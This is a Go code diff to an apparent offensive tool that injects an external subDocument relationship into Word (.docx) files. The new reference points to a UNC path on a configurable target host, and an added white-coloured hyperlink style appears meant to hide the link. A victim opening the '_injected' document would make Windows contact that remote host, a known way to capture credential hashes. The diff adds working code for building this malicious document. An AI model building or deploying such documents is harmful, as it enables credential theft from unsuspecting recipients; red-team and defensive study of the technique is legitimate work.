@@ -3,6 +3,7 @@ package ooxml
 import (
 	"archive/zip"
 	"encoding/xml"
+	"errors"
 	"fmt"
 	"io"
 	"log"
@@ -13,11 +14,11 @@ import (
 )
 
 // Initializes routine
-func Initialize(fileName string) error {
+func Initialize(filePath string) error {
 	log.Println("Opening document...")
 
 	// Read zip (ooxml) file
-	r, err := zip.OpenReader(fileName)
+	r, err := zip.OpenReader(filePath)
 	if err != nil {
 		return err
 	}
@@ -44,7 +45,7 @@ func Initialize(fileName string) error {
 	}
 
 	// Call writePackage to save the edited contents to a file
-	if err = writePackage(fmt.Sprintf("%s_injected.docx", strings.Split(fileName, ".")[0])); err != nil {
+	if err = writePackage(fmt.Sprintf("%s_injected.%s", strings.Split(filePath, ".")[0], strings.Split(filePath, ".")[1])); err != nil {
 		return err
 	}
 
@@ -53,6 +54,8 @@ func Initialize(fileName string) error {
 
 // Edits the contents of a zip file
 func editPackage(zipFile *zip.File, zipData []byte) error {
+	zipDataStr := string(zipData[:])
+
 	// Only the list of files we need to change
 	switch zipFile.Name {
 	case CDocumentXMLRels: // Add a new relationship element to the list
@@ -61,6 +64,7 @@ func editPackage(zipFile *zip.File, zipData []byte) error {
 			return err
 		}
 
+		// The only good reason to parse the XML here is to calculate the amount of rId's there are.
 		var idList []int
 		for _, rel := range rs.Relationships {
 			out, err := strconv.Atoi(rel.Id[len(rel.Id)-1:])
@@ -71,27 +75,48 @@ func editPackage(zipFile *zip.File, zipData []byte) error {
 			idList = append(idList, out)
 		}
 		sort.Ints(idList)
-		targetId := fmt.Sprintf("rId%d", idList[len(idList)-1]+1)
+		GlobalVar.TargetId = fmt.Sprintf("rId%d", idList[len(idList)-1]+1)
 
+		log.Printf("Appending new relationship of ID: %s\n", GlobalVar.TargetId)
 		rs.Relationships = append(rs.Relationships, Relation{
-			Id:         targetId,
+			Id:         GlobalVar.TargetId,
 			Type:       "http://schemas.openxmlformats.org/officeDocument/2006/relationships/subDocument",
 			Target:     fmt.Sprintf("file:///\\\\%s\\doc\\", GlobalVar.Target),
 			TargetMode: "External",
 		})
 
+		// The only thing that doesn't match the original relationships document are the XML self-closing tags.
 		rsParsed, err := marshalWithHeader(rs)
 		if err != nil {
 			return err
 		}
 
+		log.Printf("Applying changes to %s\n", CDocumentXMLRels)
 		appendToZip(zipFile.Name, rsParsed)
 
 	case CDocument: // The idea here is find the position of the last </w:p> before <w:sectPr> and append the subdoc element before that
-		appendToZip(zipFile.Name, zipData)
 
-	case CStyles: // TODO
-		appendToZip(zipFile.Name, zipData)
+		subdoc := fmt.Sprintf("<w:subDoc r:id=\"%s\"/>", GlobalVar.TargetId)
+		idx := strings.LastIndex(zipDataStr, "</w:p>") // For now using </w:p> might work fine. If some people experience errors I'll change to <w:sectPr/>
+		if idx == -1 {
+			return errors.New("strings.index: failed to find index for </w:p>")
+		}
+		inserted := zipDataStr[:idx] + subdoc + zipDataStr[idx:]
+
+		log.Printf("Applying changes to %s\n", CDocument)
+		appendToZip(zipFile.Name, []byte(inserted))
+
+	case CStyles: // Append a new hyperlink style here
+		style := `<w:style w:type="character" w:styleId="Hyperlink"><w:name w:val="Hyperlink"/><w:basedOn w:val="DefaultParagraphFont"/><w:uiPriority w:val="99"/><w:unhideWhenUsed/><w:rsid w:val="00400B73"/><w:rPr><w:color w:val="FFFFFF" w:themeColor="background1"/><w:u w:val="single"/></w:rPr></w:style>`
+		idx := strings.LastIndex(zipDataStr, "</w:styles>")
+		if idx == -1 {
+			return errors.New("strings.index: failed to find index for </w:styles>")
+		}
+		inserted := zipDataStr[:idx] + style + zipDataStr[idx:]
+
+		log.Printf("Applying changes to %s\n", CStyles)
+		appendToZip(zipFile.Name, []byte(inserted))
+
 	default: // Appends all other unchanged files to the zip
 		appendToZip(zipFile.Name, zipData)
 	}
@@ -100,8 +125,9 @@ func editPackage(zipFile *zip.File, zipData []byte) error {
 }
 
 // Writes a new zip file with the edited content
-func writePackage(fileName string) error {
-	f, err := os.Create(fileName)
+func writePackage(filePath string) error {
+	log.Printf("Creating new OOXML file at: %s\n", filePath)
+	f, err := os.Create(filePath)
 	if err != nil {
 		return err
 	}
@@ -110,8 +136,6 @@ func writePackage(fileName string) error {
 	w := zip.NewWriter(f)
 
 	for _, file := range ZipArray.Files {
-		log.Printf("%s", file.Name)
-
 		zf, err := w.Create(file.Name)
 		if err != nil {
 			return err
